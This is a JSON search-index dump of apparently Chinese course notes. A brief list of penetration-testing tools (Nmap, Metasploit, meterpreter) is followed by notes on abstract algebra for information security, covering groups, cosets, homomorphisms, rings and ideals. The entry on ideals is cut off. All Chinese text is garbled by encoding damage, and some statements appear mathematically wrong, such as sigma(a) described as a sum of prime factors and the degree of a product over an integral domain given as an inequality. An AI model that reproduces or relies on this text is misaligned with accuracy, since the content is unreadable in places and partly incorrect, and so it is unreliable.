ä¿¡æ¯æ”¶é›†æ¡†æ¶ï¼šRecon-ngã€Discoverã€SpiderFootã€Gitrob-Github   ç«¯å£æ‰«æï¼šNmapã€Zmapã€Masccan æ¼æ´æ‰«æï¼šCobalstrikeã€Tenable Nessusã€Rapid7 Nexposeã€OpenVasã€Metasploitã€Nmap scriptsã€å·¡é£ï¼ˆåå†…ç½‘èµ„äº§å®¡è®¡ï¼‰ æ¼æ´åˆ©ç”¨ï¼šmetasploitã€meterpreter æ·»åŠ è·¯ç”±ï¼šroute add/remove subnet_addr  åŸŸæ¸—é€ #   å·¥ä½œç»„ã€å®¶åº­ç»„ P.S.ï¼šä¿¡æ¯å®‰å…¨å››å¤§é¡¶ä¼šï¼ŒRSAP  "},{"id":216,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/1.week_one/","title":"1.Week One","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"ç¬¬ä¸€å‘¨ #  æ¦‚å¿µ #  é›†åˆçš„å¤§å°ï¼šé›†åˆçš„åŠ¿ã€‚\nåŸºæ•°ï¼š\nå¯æ•°é›†ï¼ˆcountable setï¼‰ï¼š a countable set is a set with the same cardinality (number of elements) as some subset of the set of natural numbers. A countable set is either a finite set or a countably infinite set.\ngraph LR; A[é›†åˆ]; B1[æœ‰é™é›†]; B2[æ— é™é›†]; C1[å¯æ•°é›†]; C2[ä¸å¯æ•°é›†]; A--\u0026gt;B1; A--\u0026gt;B2; B2--\u0026gt;C1; B2--\u0026gt;C2; åŒä½™ã€‚\nåŒä½™å…³ç³»ï¼Œç­‰ä»·å…³ç³»ã€‚\næ•°è®ºåŸºç¡€ #  æ•´é™¤çš„æ€§è´¨ã€‚\nåºå¶ã€‚åºç»„ã€‚å‰ç§¯ã€‚\nè¾—è½¬ç›¸é™¤â€”â€”æ±‚æœ€å¤§å…¬çº¦æ•°ã€‚\nå®šç†ï¼š\n å¦‚æœ a,b äº’ç´ ï¼Œå­˜åœ¨æ•´æ•° m,n ä½¿å¾— $$a m + b n = 1$$  ç®—æœ¯åŸºæœ¬å®šç†ï¼š\n ä»»ä½•ä¸€ä¸ªæ­£æ•´æ•° a å¯ä»¥åˆ†è§£æˆ $$\\displaystyle p_1^{s_1} p_2^{s_2} \u0026hellip; p_n^{s_n}$$ï¼Œå…¶ä¸­ $$p_i, i=1,2\u0026hellip;n$$ æ˜¯ç´ æ•°ã€‚  æ¢…æ£®ç´ æ•°ã€‚è²å°”é©¬ç´ æ•°ã€‚\nå®Œå…¨æ•°ï¼š\n  å¦‚æœä¸€ä¸ªæ­£æ•´æ•° N çš„æ‰€æœ‰æ­£å› å­ä¹‹å’Œä¸º 2Nï¼Œåˆ™ N ç§°ä¸ºå®Œå…¨æ•°ã€‚\n  $$\\sigma(a)$$ è¡¨ç¤º a çš„ç´ å› å­ä¹‹å’Œã€‚\n  "},{"id":217,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/10.%E5%AD%90%E7%BE%A4/","title":"10.å­ç¾¤","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"å­ç¾¤ #  æ¦‚å¿µå’Œæ€§è´¨ #  å®šä¹‰ï¼ˆå­ç¾¤ï¼‰ï¼š\n $$(G, *)$$ æ˜¯ä¸€ä¸ªç¾¤ï¼Œå­é›† $$H \\sub G$$ï¼Œå¦‚æœ H å¯¹äºè¿ç®— * ä¹Ÿæ„æˆç¾¤ï¼Œåˆ™ç§° H æ˜¯ G çš„å­ç¾¤ï¼Œè®°ä¸º $$H \\le G$$ã€‚ åˆäº $${e}, G$$ å¿…æ˜¯ G çš„å­ç¾¤ï¼Œæˆ‘ä»¬ç§°ä»–ä»¬ä¸ºå¹³å‡¡å­ç¾¤ï¼Œå¦åˆ™ä¸ºéå¹³å‡¡å­ç¾¤ å¦‚æœç¾¤ $$H \\not= G$$ï¼Œæˆ‘ä»¬ç§° H ä¸ºçœŸå­ç¾¤ï¼Œè®°ä¸º $$H \u0026lt; G$$  å®šä¹‰ï¼ˆæ­£è§„å­ç¾¤ï¼‰ï¼š\n è®¾ä¸¤ä¸ªç¾¤æ»¡è¶³ $$K \\le G$$ï¼Œå¦‚æœå¯¹ $$\\forall k \\in K, g \\in G \\Rightarrow gkg^{-1} \\in K$$ï¼Œåˆ™ K ç§°ä¸º G çš„æ­£è§„å­ç¾¤ï¼Œè®°ä¸º $$K \\vartriangleleft G$$  å®šç†ï¼š\n ä»»æ„äº¤æ¢ç¾¤ G çš„æ¯ä¸ªå­ç¾¤ K éƒ½æ˜¯æ­£è§„å­ç¾¤  å®šç†ï¼š\n è®¾ H æ˜¯ G çš„å­ç¾¤ï¼Œåˆ™ä»¥ä¸‹æ¡ä»¶ç­‰ä»·ï¼š  $$H \\vartriangleleft G$$ $$\\forall g \\in G, gHg^{-1} = H$$ $$\\forall g \\in G, gH = Hg$$ $$\\forall g_1, g_2 \\in G, g_1Hg_2H = g_1g_2H$$    "},{"id":218,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/11.%E5%BE%AA%E7%8E%AF%E7%BE%A4/","title":"11.å¾ªç¯ç¾¤","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"å¾ªç¯ç¾¤ #  æ¦‚å¿µå’Œæ€§è´¨ #  å®šä¹‰ï¼ˆå¾ªç¯å­ç¾¤ï¼‰ï¼š\n  G æ˜¯ä¸€ä¸ªç¾¤ï¼Œä¸” $$a \\in G$$ï¼Œåˆ™ä»¤ä»¥ä¸‹é›†åˆç§°ä¸ºç”±å…ƒç´  a ç”Ÿæˆçš„ G çš„å¾ªç¯å­ç¾¤ï¼š\n  $$ = {a^n | n \\in \\mathbb{Z}}$$\n  PSï¼šå®šç†ï¼š\u0026lt;a\u0026gt; æ˜¯ä¸€ä¸ªç¾¤ï¼Œä¸”æ˜¯ G çš„å­ç¾¤\n  å®šä¹‰ï¼ˆå¾ªç¯ç¾¤ï¼‰ï¼š\n G æ˜¯ä¸€ä¸ªç¾¤ï¼Œå¦‚æœå­˜åœ¨ $$a \\in G$$ ä½¿å¾— $$G = $$ã€‚åˆ™ç§° G ä¸ºå¾ªç¯ç¾¤ï¼Œè€Œä¸”ç§° a ä¸º G çš„ç”Ÿæˆå…ƒã€‚  å®šç†ï¼š\n å¦‚æœ G=\u0026lt;a\u0026gt; æ˜¯ä¸€ä¸ªå¾ªç¯ç¾¤ï¼Œä¸” $$|G| = n$$ï¼Œåˆ™å½“ä¸”ä»…å½“ $$gcd(k, n) = 1$$ æ—¶ï¼Œ$$a^k$$ æ˜¯ G çš„ç”Ÿæˆå…ƒã€‚ æ¨è®ºï¼šn é˜¶å¾ªç¯ç¾¤å…±æœ‰ $$\\phi(n)$$ ä¸ªç”Ÿæˆå…ƒã€‚  å®šç†ï¼š\n å¦‚æœ G=\u0026lt;a\u0026gt; æ˜¯ä¸€ä¸ªå¾ªç¯ç¾¤ï¼Œä¸” $$S \\le G$$ï¼Œåˆ™ S å¿…å®šæ˜¯å¾ªç¯ç¾¤ï¼Œä¸”å¦‚æœ k æ˜¯ä½¿å¾— $$a^k \\in S$$ çš„æœ€å°æ­£æ•´æ•°ï¼Œåˆ™ $$a^k$$ æ˜¯ S çš„ç”Ÿæˆå…ƒã€‚  "},{"id":219,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/12.%E7%BD%AE%E6%8D%A2%E7%BE%A4/","title":"12.ç½®æ¢ç¾¤","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"ç½®æ¢ç¾¤ #  å®šä¹‰ä¸æ¦‚å¿µ #  å®šä¹‰ï¼ˆç½®æ¢ï¼‰ï¼š\n ç»™å®šéç©ºé›†åˆ Xï¼Œå°†ä»»æ„ä¸€ä¸ªåŒå°„ $$\\alpha: X \\rightarrow X$$ ç§°ä½œé›†åˆ X çš„ä¸€ä¸ªç½®æ¢ã€‚  å®šä¹‰ï¼ˆå¯¹ç§°ç¾¤ï¼‰ï¼š\n  å¦‚æœæŠŠå‡½æ•°çš„å¤åˆ $$\\circ$$ çœ‹ä½œä¸€ç§ç½®æ¢é—´çš„äºŒå…ƒè¿ç®—ï¼Œå¯ä»¥è¯æ˜ X çš„æ‰€æœ‰ç½®æ¢æ‰€ç»„æˆçš„é›†åˆ $$S_X$$ ä¸è¿™ä¸ªäºŒå…ƒè¿ç®— $$\\circ$$ ç»„æˆçš„ä»£æ•°ç³»ç»Ÿæ„æˆä¸€ä¸ªç¾¤ã€‚æˆ‘ä»¬å°†ä¸Šè¿°çš„ç¾¤ $$(S_X, \\circ)$$ ç§°ä¸ºé›†åˆ X ä¸Šçš„å¯¹ç§°ç¾¤ (Symmetric Group)ã€‚\n  å½“ $$X = {1, 2, \\cdots, n}$$ æ—¶ï¼Œç§° $$S_X$$ ä¸º n æ¬¡å¯¹ç§°ç¾¤ï¼Œè®°ä½œ $$S_n$$ã€‚å¯ä»¥ç”¨å¦‚ä¸‹çš„è®°å·æ¥è¡¨ç¤º $$S_n$$ ä¸­çš„ç½®æ¢ $$\\alpha$$ï¼š\n$$\\alpha = \\begin{pmatrix}1 \u0026amp; 2 \u0026amp; \\cdots \u0026amp; n \\ \\alpha(1) \u0026amp; \\alpha(2) \u0026amp; \\cdots \u0026amp; \\alpha(n) \\end{pmatrix}$$ã€‚\n  å®šä¹‰ï¼ˆè½®æ¢ï¼‰ï¼š\n  è®¾ $$\\alpha \\in S_n, A = {i_1, i_2, \\cdots, i_r} \\sub N = {1, 2, \\cdots, n}, B = N - A$$ã€‚å¦‚æœç½®æ¢ $$\\alpha $$ æ»¡è¶³ï¼š\n å¯¹ A ä¸­çš„å…ƒç´ æœ‰ $$\\alpha(i_1) = i_2, \\alpha(i_2) = i_3, \\cdots, \\alpha(i_r) = i_1$$ å¯¹ B ä¸­çš„å…ƒç´ æœ‰ $$\\alpha(i) = i$$    åˆ™ç§°ç½®æ¢ $$\\alpha$$ ä¸ºä¸€ä¸ª r-è½®æ¢ï¼Œä¹ŸæŠŠ 2-è½®æ¢ç§°ä¸ºå¯¹æ¢ã€‚\n  "},{"id":220,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/13.%E9%99%AA%E9%9B%86%E4%B8%8E%E5%95%86%E7%BE%A4/","title":"13.é™ªé›†ä¸å•†ç¾¤","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"é™ªé›†ä¸å•†ç¾¤ #  é™ªé›† #  å®šä¹‰ï¼ˆå·¦é™ªé›†ï¼‰ï¼š\n $$(G, \\cdot)$$ ä¸ºç¾¤ï¼Œ$$H \\le G, a\\in G$$ï¼Œæˆ‘ä»¬ç”¨ç¬¦å·aH æ¥è¡¨ç¤ºå¦‚ä¸‹ G çš„å­é›†ï¼š$$aH = {ah | h \\in H}$$ã€‚å¹¶ä¸”ç§°è¿™æ ·çš„å­é›†ä¸ºå­ç¾¤ H çš„å·¦é™ªé›†ã€‚  å®šä¹‰ï¼ˆå·¦é™ªé›†å…³ç³»ï¼‰ï¼š\n è®¾ç¾¤ $$(H, \\cdot)$$ ä¸ºç¾¤ $$(G, \\cdot)$$ çš„å­ç¾¤ï¼Œæˆ‘ä»¬ç¡®å®š G ä¸Šçš„ä¸€ä¸ªå…³ç³»ï¼š$$a, b \\in G, a \\equiv b \\Leftrightarrow a^{-1} \\cdot b \\in H$$ï¼Œè¿™ä¸ªå…³ç³»ç§°ä½œ G ä¸Šå…³äº H çš„å·¦é™ªé›†å…³ç³»ã€‚  å®šç†ï¼š\n è®¾ç¾¤ $$(H, \\cdot)$$ ä¸ºç¾¤ $$(G, \\cdot)$$ çš„å­ç¾¤ï¼Œåˆ™ G ä¸Šå…³äº H çš„å·¦é™ªé›†å…³ç³»æ˜¯ä¸€ä¸ªç­‰ä»·å…³ç³»ã€‚  å®šä¹‰ï¼ˆç­‰ä»·ç±»ï¼‰ï¼š\n ç¾¤ $$(G, \\cdot)$$ çš„å­ç¾¤ $$(H, \\cdot)$$ æ‰€ç¡®å®šçš„å·¦é™ªé›†å…³ç³»å¯¹ G åˆ’åˆ†ç­‰ä»·ç±»ï¼Œæˆ‘ä»¬å°†ä¸‹é¢çš„ç­‰ä»·ç±»å«åšä»¥ a ä¸ºä»£è¡¨å…ƒçš„ç­‰ä»·ç±» $$[a] = {x | x \\in G \\and a \\equiv x}$$  å®šç†ï¼š\n è®¾ç¾¤ $$(H, \\cdot)$$ ä¸ºç¾¤ $$(G, \\cdot)$$ çš„å­ç¾¤ï¼Œåˆ™æœ‰ $$[a] = aH$$  å®šç†ï¼š\n è®¾ç¾¤ $$(H, \\cdot)$$ ä¸ºç¾¤ $$(G, \\cdot)$$ çš„å­ç¾¤ï¼Œ$$a, b \\in G$$ï¼Œåˆ™ï¼š  $$aH = bH \\Leftrightarrow b^{-1} \\cdot a \\in H$$ï¼Œç‰¹åˆ«åœ°ï¼Œ$$aH = H \\Leftrightarrow a \\in H$$ å¦‚æœ $$aH \\cap bH \\not= \\varnothing$$ï¼Œé‚£ä¹ˆ $$aH = bH$$ å¯¹ $$\\forall a \\in G, |aH| = |H|$$    å®šç†ï¼ˆæ‹‰æ ¼æœ—æ—¥å®šç†ï¼‰ï¼š\n è®¾ $$(H, \\cdot)$$ ä¸ºæœ‰é™ç¾¤ $$(G, \\cdot)$$ çš„å­ç¾¤ï¼Œåˆ™ $$|H|$$ ä¸º $$|G|$$ çš„å› å­ã€‚  å•†ç¾¤ #  å®šä¹‰ï¼ˆå•†é›†ï¼‰ï¼š\n è®¾ç¾¤ $$(G, \\cdot)$$ æœ‰ä¸€ä¸ªå­ç¾¤ $$(H, \\cdot)$$ï¼Œåˆ™ H åœ¨ G ä¸­ä¸¤ä¸¤ä¸ç›¸äº¤å·¦é™ªé›†ç»„æˆçš„é›†åˆ $${aH | a \\in G}$$ å«åš H åœ¨ G ä¸­çš„å•†é›†ï¼Œè®°ä½œ $$G / H$$ï¼› $$G / H$$ ä¸­ä¸¤ä¸¤ä¸ç›¸äº¤çš„å·¦é™ªé›†çš„ä¸ªæ•°å«åš H åœ¨ G ä¸­çš„æŒ‡æ ‡ï¼Œè®°ä¸º $$[G:H]$$  å®šä¹‰ï¼ˆå•†ç¾¤ï¼‰ï¼š\n è®¾ç¾¤ $$(G, \\cdot)$$ æœ‰ä¸€ä¸ªæ­£è§„å­ç¾¤ $$(N, \\cdot)$$ï¼Œ$$T = G / N$$ æ˜¯ N åœ¨ ï¼§ ä¸­çš„å•†é›†ï¼Œ åœ¨å•†é›† T ä¸Šå®šä¹‰äºŒå…ƒè¿ç®— $$\\odot$$ï¼š$$\\forall a,b \\in G, aN, bN \\in T \\Rightarrow aN \\odot bN = (a \\cdot b)N$$ï¼Œåˆ™ $$(T, \\odot)$$ æ„æˆç¾¤ï¼Œç§°è¿™ä¸ªç¾¤ä¸ºå•†ç¾¤ã€‚åœ¨ä¸è‡´æ··æ·†çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†å­ç¾¤ä¸å•†ç¾¤ä¸­çš„è¿ç®—éƒ½è®°ä½œ $$\\cdot$$  "},{"id":221,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/14.%E5%90%8C%E6%80%81%E4%B8%8E%E5%90%8C%E6%9E%84/","title":"14.åŒæ€ä¸åŒæ„","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"åŒæ€å’ŒåŒæ„ #  åŒæ€ä¸åŒæ„ #  å®šä¹‰ï¼ˆåŒæ€ï¼‰ï¼š\n $$(X, \\cdot)$$ ä¸ $$(Y, *)$$ æ˜¯ä¸¤ä¸ªç¾¤ï¼Œå¦‚æœå­˜åœ¨æ˜ å°„ $$x \\rightarrow y$$ï¼Œä½¿å¾— $$\\forall x_1, x_2 \\in X$$ï¼Œéƒ½æœ‰ $$f(x_1 \\cdot x_2) = f(x_1) * f(x_2) $$ï¼Œ åˆ™ç§° f æ˜¯ä» $$(X, \\cdot)$$ åˆ° $$(Y, *)$$ çš„åŒæ€æ˜ å°„æˆ–ç§°ç¾¤ $$(X, \\cdot)$$ ä¸ç¾¤ $$(Y, *)$$ åŒæ€ï¼Œè®°ä½œ $$(X, \\cdot) \\sim (Y, *)$$ æˆ– $$X \\sim Y$$ ä¸€ä¸ªç¾¤åˆ°è‡ªèº«çš„åŒæ€å«åšè‡ªåŒæ€ï¼›  å®šä¹‰ï¼ˆåŒæ„ï¼‰ï¼š\n è‹¥åŒæ€æ˜ å°„ f æ˜¯å•å°„ï¼Œåˆ™ç§°æ­¤åŒæ€ä¸ºå•åŒæ€ï¼› è‹¥åŒæ€æ˜ å°„ f æ˜¯æ»¡å°„ï¼Œåˆ™ç§°æ­¤åŒæ€ä¸ºæ»¡åŒæ€ï¼› è‹¥åŒæ€æ˜ å°„ f æ˜¯åŒå°„ï¼Œåˆ™ç§°æ­¤åŒæ€ä¸ºåŒæ„ï¼Œè®°ä½œ $$(X, \\cdot) \\cong (Y, *)$$ï¼Œæˆ–è€… $$X \\cong Y$$ï¼› ä¸€ä¸ªç¾¤åˆ°è‡ªèº«çš„åŒæ„å«åšè‡ªåŒæ„  å®šä¹‰ï¼ˆæ ¸ä¸åƒï¼‰ï¼š\n è‹¥ä¸¤ä¸ªé›†åˆæ»¡è¶³ $$(S, \\cdot) \\sim (G, \\odot)$$ï¼Œe å’Œ e\u0026rsquo; åˆ†åˆ«ä¸ºå®ƒä»¬çš„å•ä½å…ƒï¼ŒåŒæ€æ˜ å°„ $$f: S \\mapsto G$$  ä»¤é›†åˆ $$ker\\ f = {a | a \\in S \\and f(a) = e\u0026rsquo;}$$ ç§°ä¸ºåŒæ€ f çš„æ ¸ï¼› ä»¤é›†åˆ $$im\\ f = f(S) = {f(a) | a \\in S}$$ ç§°ä¸ºåŒæ€ f çš„åƒã€‚    æ­£è§„å­ç¾¤ä¸å•†ç¾¤ #  å®šä¹‰ï¼ˆè‡ªç„¶åŒæ€ï¼‰ï¼š\n $$(N, \\cdot) \\vartriangleleft (S, \\cdot)$$ï¼Œå®šä¹‰æ˜ å°„ $$f: S \\rightarrow S/N, f(a) = aN$$ï¼Œ åˆ™ f æ˜¯ç¾¤ $$(S, \\cdot)$$ åˆ°å…¶å•†ç¾¤ $$(S/N, \\odot)$$ çš„ä¸€ä¸ªåŒæ€æ˜ å°„ï¼Œç”± f å»ºç«‹çš„ä»ç¾¤ $$(S, \\cdot)$$ åˆ°ç¾¤ $$(S/N, \\odot)$$ çš„åŒæ€å«åšè‡ªç„¶åŒæ€ã€‚  å®šç†ï¼ˆåŒæ€åŸºæœ¬å®šç†ï¼‰ï¼š\n è®¾ $$f: S \\rightarrow G$$ æ˜¯ç¾¤ $$(S, \\cdot)$$ åˆ°ç¾¤ $$(G, \\times)$$ çš„åŒæ€æ˜ å°„ï¼Œåˆ™å­˜åœ¨ $$S / ker f$$ åˆ° $$im f$$ çš„æ˜ å°„ $$h: S/ ker f \\rightarrow im f$$ï¼Œä½¿å¾— $$(S / ker f, \\odot) \\cong (im f, \\times)$$  "},{"id":222,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/15.%E4%BA%A4%E6%8D%A2%E7%8E%AF%E5%92%8C%E5%9F%9F/","title":"15.äº¤æ¢ç¯å’ŒåŸŸ","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"äº¤æ¢ç¯å’ŒåŸŸ #  äº¤æ¢ç¯ #  å®šä¹‰ï¼ˆç¯ï¼‰ï¼š\n è®¾ R æ˜¯ä¸€ä¸ªç»™å®šçš„é›†åˆï¼Œåœ¨å…¶ä¸Šå®šä¹‰äº†ä¸¤ç§è¿ç®— $$+, \\cdot$$ï¼Œå¦‚æœæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œåˆ™ $$(R, +, \\cdot)$$ æ„æˆä¸€ä¸ªç¯ï¼š  $$(R, +)$$ æ˜¯ä¸€ä¸ªäº¤æ¢ç¾¤ï¼Œå…¶ä¸Šçš„å•ä½å…ƒè¢«é›¶å…ƒï¼Œå…ƒç´ åœ¨ + ä¸Šçš„é€†å…ƒè¢«ç§°ä¸ºè´Ÿå…ƒï¼› $$(R, \\cdot)$$ æ˜¯ä¸€ä¸ªåŠç¾¤ï¼Œå…¶ä¸Šçš„å•ä½å…ƒè¢«ç§°ä¸ºå¹ºå…ƒã€‚ + å…³äº $$\\cdot$$ æ»¡è¶³åˆ†é…ç‡ï¼Œå³ $$a \\cdot (b + c) = a \\cdot b + a \\cdot c$$ã€‚   å¦‚æœ $$(R, \\cdot)$$ æ»¡è¶³äº¤æ¢ç‡ï¼Œåˆ™è¯¥ç¯è¢«ç§°ä¸ºäº¤æ¢ç¯ã€‚  å®šä¹‰ï¼ˆå­ç¯ï¼‰ï¼š\n å¦‚æœäº¤æ¢ç¯ R çš„ä¸€ä¸ªä¸€ä¸ªå­é›† S æ»¡è¶³å¦‚ä¸‹çš„ä¸‰ä¸ªæ¡ä»¶ï¼Œåˆ™ç§° S æ˜¯ R çš„å­ç¯ï¼š  $$I \\in S$$ å¦‚æœ $$a, b \\in S$$ï¼Œåˆ™ $$a - b \\in S$$ å¦‚æœ $$a, b \\in S$$ï¼Œåˆ™ $$ab \\in S$$    æ•´ç¯ #  å®šä¹‰ï¼ˆé›¶å› å­ï¼‰ï¼š\n ä¸€ä¸ªéé›¶å…ƒç´  a æ˜¯ä¸€ä¸ªå·¦é›¶å› å­ï¼Œå½“ä¸”ä»…å½“å­˜åœ¨ä¸€ä¸ªéé›¶å…ƒç´  bï¼Œä½¿å¾— ab=0ã€‚åŒæ ·å¯ä»¥å®šä¹‰å³é›¶å› å­ã€‚å·¦é›¶å› å­ä¸å³é›¶å› å­ç»Ÿç§°ä¸ºé›¶å› å­ã€‚  å®šä¹‰ï¼ˆæ•´ç¯ï¼‰ï¼š\n äº¤æ¢ç¯ $$(R, +, \\cdot)$$ ä¸­è‡³å°‘æœ‰ä¸¤ä¸ªå…ƒç´ ï¼ˆå…¶ä¸­ä¸€ä¸ªæ˜¯é›¶å…ƒã€å¦ä¸€ä¸ªæ˜¯å¹ºå…ƒï¼‰ï¼Œä¸” R ä¸­æ²¡æœ‰é›¶å› å­ï¼Œåˆ™æˆ‘ä»¬ç§°è¿™æ ·çš„äº¤æ¢ç¯ä¸ºæ•´ç¯ã€‚  å®šä¹‰ï¼ˆçœŸå› å­ï¼‰ï¼š\n $$(R, +, \\cdot)$$ æ˜¯äº¤æ¢ç¯ï¼Œ$$a, b \\in R, b \\not= 0$$ã€‚å¦‚æœå­˜åœ¨ä¸€ä¸ªå…ƒç´  $$c \\in R$$ï¼Œä½¿å¾— $$a = b \\cdot c$$ï¼Œåˆ™ç§° b æ•´é™¤ a æˆ–è€… b è¢« a æ•´é™¤ï¼Œè®°åš b | aã€‚æŠŠ b ç§°ä½œ a çš„å› å­ï¼Œa ç§°ä¸º b çš„å€å…ƒã€‚ å¦‚æœ b, c éƒ½ä¸å¯é€†ï¼Œåˆ™ b ç§°ä¸º a çš„çœŸå› å­ã€‚  ä¸€ä¸ªå®šä¹‰ï¼šçº¿æ€§ç»„åˆã€ç›¸ä¼´å…ƒç´ ã€ä¸å¯çº¦å…ƒç´ \nåŸŸ #  å®šä¹‰ï¼ˆåŸŸï¼‰ï¼š\n è®¾ $$(F, +, \\cdot)$$ æ˜¯ä¸€ä¸ªéé›¶äº¤æ¢ç¯ï¼Œå¦‚æœå®ƒçš„æ¯ä¸ªéé›¶å…ƒç´ éƒ½æ˜¯å¯é€†å…ƒç´ ï¼Œé‚£ä¹ˆå®ƒç§°ä¸ºåŸŸã€‚  "},{"id":223,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/16.%E4%B8%80%E5%85%83%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%8E%AF/","title":"16.ä¸€å…ƒå¤šé¡¹å¼ç¯","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"ä¸€å…ƒå¤šé¡¹å¼ç¯ #  æ¦‚å¿µä¸æ€§è´¨ #  å®šä¹‰ï¼ˆä¸€äº›å®šä¹‰ï¼‰ï¼š\n  è®¾ $$(R, +, \\cdot)$$ æ˜¯äº¤æ¢ç¯ï¼Œx æ˜¯ä¸€ä¸ªå˜å…ƒï¼Œn æ˜¯éè´Ÿæ•´æ•°ï¼Œ$$a_0, a_1, \\cdots, a_n \\in R$$ï¼Œåˆ™ $$f(x) = a_0 + a_1 x + \\cdots + a_n x^n$$ ç§°ä¸ºäº¤æ¢ç¯ R ä¸Šçš„ä¸€å…ƒå¤šé¡¹å¼ã€‚\n  å…¶ä¸­ $$a_0, a_1, \\cdots, a_n$$ ç§°ä¸ºè¯¥å¤šé¡¹å¼çš„ç³»æ•°ï¼Œ$$a_0$$ ç§°ä¸ºå¸¸æ•°é¡¹ã€‚\n  å¦‚æœ $$a_n \\not= 0$$ï¼Œé‚£ä¹ˆç§° $$a_n$$ ä¸ºé¦–é¡¹ç³»æ•°ï¼Œn ç§°ä¸ºä¸€å…ƒå¤šé¡¹å¼ f(x) çš„æ¬¡æ•°ï¼Œè®°åš $$\\deg f(x) = n$$\n  æ‰€æœ‰äº¤æ¢ç¯ä¸Šçš„ä¸€å…ƒå¤šé¡¹å¼ç»„æˆçš„é›†åˆè®°åš Rã€‚\n  å®šç†ï¼š\n è®¾ $$(R, +, \\cdot)$$ æ˜¯äº¤æ¢ç¯ï¼Œf(x) å’Œ g(x) æ˜¯ Rä¸­çš„ä¸¤ä¸ªéé›¶å¤šé¡¹å¼ï¼Œåˆ™ï¼š  $$f \\times g = \\text{é›¶å¤šé¡¹å¼}$$ æˆ–è€… $$\\deg f \\times g \\le \\deg f + \\deg g$$ å¦‚æœ $$(R, +, \\cdot)$$ æ˜¯æ•´ç¯ï¼Œé‚£ä¹ˆ $$f \\times g \\not= \\text{é›¶å¤šé¡¹å¼}$$ ä¸” $$\\deg f \\times g \\le \\deg f + \\deg g$$    å®šä¹‰ï¼ˆä¸€å…ƒå¤šé¡¹å¼ç¯ï¼‰ï¼š\n $$(R, +, \\cdot)$$ æ˜¯äº¤æ¢ç¯ï¼Œåˆ™ç§° $$(R, +, \\times)$$ ä¸º R ä¸Šçš„ä¸€å…ƒå¤šé¡¹å¼ç¯ã€‚  "},{"id":224,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/17.%E7%90%86%E6%83%B3%E5%92%8C%E5%95%86%E7%8E%AF/","title":"17.ç†æƒ³å’Œå•†ç¯","section":"ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€","content":"ç†æƒ³å’Œå•†ç¯ #  ç†æƒ³ #  å®šä¹‰ï¼ˆç†æƒ³ï¼‰ï¼š\n è®¾ $$(R, +, \\cdot)$$ æ˜¯ä¸€ä¸ªäº¤æ¢ç¯ï¼ŒI æ˜¯ R çš„å­é›†ï¼Œä½¿å¾—ï¼š  $$0 \\in I$$ï¼› $$\\forall a, b \\in I \\Rightarrow a+b \\in I$$ï¼› $$\\forall a \\in I, r \\in R \\Rightarrow ra \\in I$$ï¼›   åˆ™å°† I ç§°ä¸º R çš„ç†æƒ³ï¼Œæ˜¾ç„¶ R çš„ä¸¤ä¸ªå¹³å‡¡å­ç¯éƒ½æ˜¯ R çš„ç†æƒ³ï¼Œç§°ä¸º R çš„å¹³å‡¡ç†æƒ³ã€‚éå¹³å‡¡ç†æƒ³ç§°ä¸ºçœŸç†æƒ³ã€‚  å®šç†ï¼š\n è®¾ f æ˜¯äº¤æ¢ç¯ S åˆ°äº¤æ¢ç¯ G çš„åŒæ€æ˜ å°„ï¼Œåˆ™ im f æ˜¯ G çš„å­ç¯ï¼Œker f æ˜¯ S çš„ç†æƒ³ã€‚  å®šä¹‰ï¼ˆä¸»ç†æƒ³ï¼‰ï¼š\n $$(R, +, \\cdot)$$ æ˜¯ä¸€ä¸ªäº¤æ¢ç¯ï¼ŒH æ˜¯ R 